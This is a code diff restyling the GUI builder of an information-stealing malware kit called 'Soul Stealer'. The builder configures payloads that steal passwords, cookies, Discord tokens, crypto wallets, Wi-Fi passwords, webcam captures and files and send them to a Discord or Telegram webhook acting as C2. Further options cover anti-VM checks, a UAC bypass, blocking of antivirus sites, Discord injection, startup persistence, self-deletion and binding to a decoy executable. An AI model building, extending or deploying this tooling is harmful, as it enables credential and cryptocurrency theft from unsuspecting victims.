@@ -105,14 +105,13 @@ class Utility:
 class BuilderOptionsFrame(ctk.CTkFrame):
 
 	def __init__(self, master) -> None:
-		super().__init__(master, fg_color= "transparent")
+		super().__init__(master, fg_color="#2A003F")
 
-		self.fakeErrorData = [False, ("", "", 0)] # (Title, Message, Icon)
-		self.pumpLimit = 0 # Bytes
+		self.fakeErrorData = [False, ("", "", 0)]
+		self.pumpLimit = 0
 
 		self.grid_propagate(False)
-
-		self.font = ctk.CTkFont(size= 20)
+		self.font = ctk.CTkFont(size=18)
 
 		self.pingMeVar = ctk.BooleanVar(self)
 		self.vmProtectVar = ctk.BooleanVar(self)
@@ -123,7 +122,6 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.discordInjectionVar = ctk.BooleanVar(self)
 		self.uacBypassVar = ctk.BooleanVar(self)
 		self.pumpStubVar = ctk.BooleanVar(self)
-
 		self.captureWebcamVar = ctk.BooleanVar(self)
 		self.capturePasswordsVar = ctk.BooleanVar(self)
 		self.captureCookiesVar = ctk.BooleanVar(self)
@@ -137,112 +135,81 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.captureTelegramVar = ctk.BooleanVar(self)
 		self.captureCommonFilesVar = ctk.BooleanVar(self)
 		self.captureWalletsVar = ctk.BooleanVar(self)
-		
+
 		self.boundExePath = ""
 		self.boundExeRunOnStartup = False
 		self.iconBytes = ""
-
 		self.OutputAsExe = True
-		self.ConsoleMode = 0 # 0 = None, 1 = Force, 2 = Debug
-		self.C2Mode = 0 # 0 = Discord, 1 = Telegram
+		self.ConsoleMode = 0
+		self.C2Mode = 0
 
-		for i in range(7): # Set 7 rows
-			self.rowconfigure(i, weight= 1)
-		
-		for i in range(6): # Set 6 columns
-			self.columnconfigure(i, weight= 1)
+		for i in range(7):
+			self.rowconfigure(i, weight=1)
+		for i in range(6):
+			self.columnconfigure(i, weight=1)
 
-		# Controls
+		entry_fg = "#3E2165"
+		btn_fg = "#7D3AC1"
+		btn_hover = "#5B1A8A"
+		text_col = "#E0D5F9"
+		chk_border = "#B980F2"
+		chk_hover = "#5B1A8A"
 
-		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text= "Enter Webhook Here", height= 38, font= self.font, text_color= "white")
-		self.C2EntryControl.grid(row= 0, column= 0, sticky= "ew", padx= (15, 5), columnspan= 5)
+		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text="Enter Webhook Here", height=38, font=self.font, text_color=text_col, fg_color=entry_fg)
+		self.C2EntryControl.grid(row=0, column=0, sticky="ew", padx=(15, 5), columnspan=5)
 
-		self.testC2ButtonControl = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#040117", text_color_disabled= "Dark green", command= lambda: Thread(target= self.testC2ButtonControl_Callback).start())
-		self.testC2ButtonControl.grid(row= 0, column= 5, sticky= "ew", padx = (5, 15))
-		
-		self.pingMeCheckboxControl = ctk.CTkCheckBox(self, text= "Ping Me", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.pingMeVar)
-		self.pingMeCheckboxControl.grid(row= 1, column= 0, sticky= "w", padx= 20)
+		self.testC2ButtonControl = ctk.CTkButton(self, text="Test Webhook", height=38, font=self.font, fg_color=btn_fg, hover_color=btn_hover, text_color=text_col, command=lambda: Thread(target=self.testC2ButtonControl_Callback).start())
+		self.testC2ButtonControl.grid(row=0, column=5, sticky="ew", padx=(5, 15))
 
-		self.vmProtectCheckboxControl = ctk.CTkCheckBox(self, text= "Anti VM", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.vmProtectVar)
-		self.vmProtectCheckboxControl.grid(row= 2, column= 0, sticky= "w", padx= 20)
+		def create_checkbox(row, col, text, var, cmd=None):
+			cb = ctk.CTkCheckBox(self, text=text, font=self.font, height=38, hover_color=chk_hover, border_color=chk_border, fg_color="#2A003F", text_color=text_col, text_color_disabled="grey", variable=var, command=cmd)
+			cb.grid(row=row, column=col, sticky="w", padx=20)
 
-		self.startupCheckboxControl = ctk.CTkCheckBox(self, text= "Put On Startup", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.startupVar)
-		self.startupCheckboxControl.grid(row= 3, column= 0, sticky= "w", padx= 20)
+		create_checkbox(1, 0, "Ping Me", self.pingMeVar)
+		create_checkbox(2, 0, "Anti VM", self.vmProtectVar)
+		create_checkbox(3, 0, "Put On Startup", self.startupVar)
+		create_checkbox(4, 0, "Melt Stub", self.meltVar)
+		create_checkbox(5, 0, "Pump Stub", self.pumpStubVar, self.pumpStub_Event)
 
-		self.meltCheckboxControl = ctk.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.meltVar)
-		self.meltCheckboxControl.grid(row= 4, column= 0, sticky= "w", padx= 20)
+		create_checkbox(1, 1, "Webcam", self.captureWebcamVar)
+		create_checkbox(2, 1, "Passwords", self.capturePasswordsVar)
+		create_checkbox(3, 1, "Cookies", self.captureCookiesVar)
+		create_checkbox(4, 1, "History", self.captureHistoryVar)
+		create_checkbox(5, 1, "Autofills", self.captureAutofillsVar)
 
-		self.pumpStubCheckboxControl = ctk.CTkCheckBox(self, text= "Pump Stub", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", command= self.pumpStub_Event, variable= self.pumpStubVar)
-		self.pumpStubCheckboxControl.grid(row= 5, column= 0, sticky= "w", padx= 20)
+		create_checkbox(1, 2, "Discord Tokens", self.captureDiscordTokensVar)
+		create_checkbox(2, 2, "Games", self.captureGamesVar)
+		create_checkbox(3, 2, "Wallets", self.captureWalletsVar)
+		create_checkbox(4, 2, "Wifi Passwords", self.captureWifiPasswordsVar)
 
-		self.captureWebcamCheckboxControl = ctk.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureWebcamVar)
-		self.captureWebcamCheckboxControl.grid(row= 1, column= 1, sticky= "w", padx= 20)
+		create_checkbox(1, 3, "System Info", self.captureSystemInfoVar)
+		create_checkbox(2, 3, "Screenshot", self.captureScreenshotVar)
+		create_checkbox(3, 3, "Telegram", self.captureTelegramVar)
+		create_checkbox(4, 3, "Common Files", self.captureCommonFilesVar)
 
-		self.capturePasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "Passwords", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.capturePasswordsVar)
-		self.capturePasswordsCheckboxControl.grid(row= 2, column= 1, sticky= "w", padx= 20)
+		create_checkbox(1, 4, "Fake Error", self.fakeErrorVar, self.fakeError_Event)
+		create_checkbox(2, 4, "Block AV Sites", self.blockAvSitesVar)
+		create_checkbox(3, 4, "Discord Injection", self.discordInjectionVar)
+		create_checkbox(4, 4, "UAC Bypass", self.uacBypassVar)
 
-		self.captureCookiesCheckboxControl = ctk.CTkCheckBox(self, text= "Cookies", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureCookiesVar)
-		self.captureCookiesCheckboxControl.grid(row= 3, column= 1, sticky= "w", padx= 20)
+		self.C2ModeButtonControl = ctk.CTkButton(self, text="C2: Discord", height=38, font=self.font, fg_color=btn_fg, hover_color=btn_hover, text_color=text_col, command=self.C2ModeButtonControl_Callback)
+		self.C2ModeButtonControl.grid(row=1, column=5, sticky="ew", padx=(0, 15))
 
-		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "History", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureHistoryVar)
-		self.captureHistoryCheckboxControl.grid(row= 4, column= 1, sticky= "w", padx= 20)
+		self.bindExeButtonControl = ctk.CTkButton(self, text="Bind Executable", height=38, font=self.font, fg_color=btn_fg, hover_color=btn_hover, text_color=text_col, command=self.bindExeButtonControl_Callback)
+		self.bindExeButtonControl.grid(row=2, column=5, sticky="ew", padx=(0, 15))
 
-		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "Autofills", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureAutofillsVar)
-		self.captureHistoryCheckboxControl.grid(row= 5, column= 1, sticky= "w", padx= 20)
+		self.selectIconButtonControl = ctk.CTkButton(self, text="Select Icon", height=38, font=self.font, fg_color=btn_fg, hover_color=btn_hover, text_color=text_col, command=self.selectIconButtonControl_Callback)
+		self.selectIconButtonControl.grid(row=3, column=5, sticky="ew", padx=(0, 15))
 
-		self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Tokens", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureDiscordTokensVar)
-		self.captureDiscordTokensCheckboxControl.grid(row= 1, column= 2, sticky= "w", padx= 20)
+		self.buildModeButtonControl = ctk.CTkButton(self, text="Output: EXE File", height=38, font=self.font, fg_color=btn_fg, hover_color=btn_hover, text_color=text_col, command=self.buildModeButtonControl_Callback)
+		self.buildModeButtonControl.grid(row=4, column=5, sticky="ew", padx=(0, 15))
 
-		self.captureGamesCheckboxControl = ctk.CTkCheckBox(self, text= "Games", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureGamesVar)
-		self.captureGamesCheckboxControl.grid(row= 2, column= 2, sticky= "w", padx= 20)
+		self.consoleModeButtonControl = ctk.CTkButton(self, text="Console: None", height=38, font=self.font, fg_color=btn_fg, hover_color=btn_hover, text_color=text_col, command=self.consoleModeButtonControl_Callback)
+		self.consoleModeButtonControl.grid(row=5, column=5, sticky="ew", padx=(0, 15))
 
-		self.captureWalletsCheckboxControl = ctk.CTkCheckBox(self, text= "Wallets", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureWalletsVar)
-		self.captureWalletsCheckboxControl.grid(row= 3, column= 2, sticky= "w", padx= 20)
+		self.buildButtonControl = ctk.CTkButton(self, text="Build", height=38, font=self.font, fg_color="#A020F0", hover_color="#B266FF", text_color="#FFFFFF", command=self.buildButtonControl_Callback)
+		self.buildButtonControl.grid(row=6, column=5, sticky="ew", padx=(0, 15))
 
-		self.captureWifiPasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "Wifi Passwords", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureWifiPasswordsVar)
-		self.captureWifiPasswordsCheckboxControl.grid(row= 4, column= 2, sticky= "w", padx= 20)
-
-		self.captureSysteminfoCheckboxControl = ctk.CTkCheckBox(self, text= "System Info", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureSystemInfoVar)
-		self.captureSysteminfoCheckboxControl.grid(row= 1, column= 3, sticky= "w", padx= 20)
-
-		self.captureScreenshotCheckboxControl = ctk.CTkCheckBox(self, text= "Screenshot", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureScreenshotVar)
-		self.captureScreenshotCheckboxControl.grid(row= 2, column= 3, sticky= "w", padx= 20)
-
-		self.captureTelegramChecboxControl = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureTelegramVar)
-		self.captureTelegramChecboxControl.grid(row= 3, column= 3, sticky= "w", padx= 20)
-
-		self.captureCommonFilesChecboxControl = ctk.CTkCheckBox(self, text= "Common Files", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.captureCommonFilesVar)
-		self.captureCommonFilesChecboxControl.grid(row= 4, column= 3, sticky= "w", padx= 20)
-
-		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", command= self.fakeError_Event, variable= self.fakeErrorVar)
-		self.fakeErrorCheckboxControl.grid(row= 1, column= 4, sticky= "w", padx= 20)
-
-		self.blockAvSitesCheckboxControl = ctk.CTkCheckBox(self, text= "Block AV Sites", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.blockAvSitesVar)
-		self.blockAvSitesCheckboxControl.grid(row= 2, column= 4, sticky= "w", padx= 20)
-
-		self.discordInjectionCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Injection", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.discordInjectionVar)
-		self.discordInjectionCheckboxControl.grid(row= 3, column= 4, sticky= "w", padx= 20)
-
-		self.uacBypassCheckboxControl = ctk.CTkCheckBox(self, text= "UAC Bypass", font= self.font, height= 38, hover_color= "#040117", text_color= "Dark green", text_color_disabled= "grey", variable= self.uacBypassVar)
-		self.uacBypassCheckboxControl.grid(row= 4, column= 4, sticky= "w", padx= 20)
-
-		self.C2ModeButtonControl = ctk.CTkButton(self, text= "C2: Discord", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "Dark Black", command= self.C2ModeButtonControl_Callback)
-		self.C2ModeButtonControl.grid(row= 1, column= 5, sticky= "ew", padx= (0, 15))
-
-		self.bindExeButtonControl = ctk.CTkButton(self, text= "Bind Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "Dark Black", command= self.bindExeButtonControl_Callback)
-		self.bindExeButtonControl.grid(row= 2, column= 5, sticky= "ew", padx= (0, 15))
-
-		self.selectIconButtonControl = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.selectIconButtonControl_Callback)
-		self.selectIconButtonControl.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))
-
-		self.buildModeButtonControl = ctk.CTkButton(self, text= "Output: EXE File", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.buildModeButtonControl_Callback)
-		self.buildModeButtonControl.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))
-
-		self.consoleModeButtonControl = ctk.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.consoleModeButtonControl_Callback)
-		self.consoleModeButtonControl.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))
-
-		self.buildButtonControl = ctk.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#1E5128", hover_color= "#4E9F3D", text_color_disabled= "grey", command= self.buildButtonControl_Callback)
-		self.buildButtonControl.grid(row= 6, column= 5, sticky= "ew", padx= (0, 15))
 
 	def C2ModeButtonControl_Callback(self) -> None:
 		self.focus() # Removes focus from the C2 text box
@@ -754,27 +721,69 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 		self.destroy()
 
 class Builder(ctk.CTk):
-	
+
 	def __init__(self) -> None:
 		super().__init__()
 
 		ctk.set_appearance_mode("dark")
 		self.title("Soul Stealer [Builder]")
 		self.iconbitmap(os.path.join("Extras", "icon.ico"))
-		self.geometry("1250x600")
+		self.geometry("1250x700")
 		self.resizable(False, False)
 
-		self.rowconfigure(0, weight= 1)
-		self.rowconfigure(1, weight= 5)
+		self.configure(fg_color="#1A1A1D")  # Fond sombre hacker
 
-		self.columnconfigure(0, weight= 1)
-		self.columnconfigure(1, weight= 0)
+		# Layout: Sidebar (col 0), Main panel (col 1)
+		self.columnconfigure(0, weight=0)
+		self.columnconfigure(1, weight=1)
+		self.rowconfigure(0, weight=1)
 
-		self.titleLabel = ctk.CTkLabel(self, text= "Soul Stealer", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#1be31b")
-		self.titleLabel.grid(row= 0, column= 0)
+		# Sidebar
+		self.sidebar = ctk.CTkFrame(self, fg_color="#2A003F", width=220)
+		self.sidebar.grid(row=0, column=0, sticky="ns")
+		self.sidebar.grid_propagate(False)
 
-		self.builderOptions = BuilderOptionsFrame(self)
-		self.builderOptions.grid(row= 1, column= 0, sticky= "nsew")
+		self.titleLabel = ctk.CTkLabel(
+			self.sidebar,
+			text="Soul Stealer",
+			font=ctk.CTkFont(size=32, weight="bold"),
+			text_color="#FFFFFF"
+		)
+		self.titleLabel.pack(pady=(30, 20))
+
+		# Example buttons in sidebar (navigation non-fonctionnelle mais décorative)
+		self.sidebar_button1 = ctk.CTkButton(
+			self.sidebar,
+			text="Builder",
+			font=ctk.CTkFont(size=16),
+			fg_color="#7D3AC1",
+			hover_color="#5B1A8A",
+			text_color="#FFFFFF"
+		)
+		self.sidebar_button1.pack(pady=(10, 0), fill="x", padx=20)
+
+		self.sidebar_button2 = ctk.CTkButton(
+			self.sidebar,
+			text="Settings",
+			font=ctk.CTkFont(size=16),
+			fg_color="#2A003F",
+			hover_color="#5B1A8A",
+			text_color="#E0D5F9"
+		)
+		self.sidebar_button2.pack(pady=(10, 0), fill="x", padx=20)
+
+		# Main content area
+		self.mainPanel = ctk.CTkFrame(self, fg_color="#2A003F")
+		self.mainPanel.grid(row=0, column=1, sticky="nsew", padx=(10, 20), pady=20)
+		self.mainPanel.grid_propagate(True)
+		self.mainPanel.rowconfigure(0, weight=1)
+		self.mainPanel.columnconfigure(0, weight=1)
+
+		# Inject the options frame here
+		self.builderOptions = BuilderOptionsFrame(self.mainPanel)
+		self.builderOptions.grid(row=0, column=0, sticky="nsew")
+
+
 	
 	def BuildPythonFile(self, config: str) -> None:
 		options = json.loads(config)
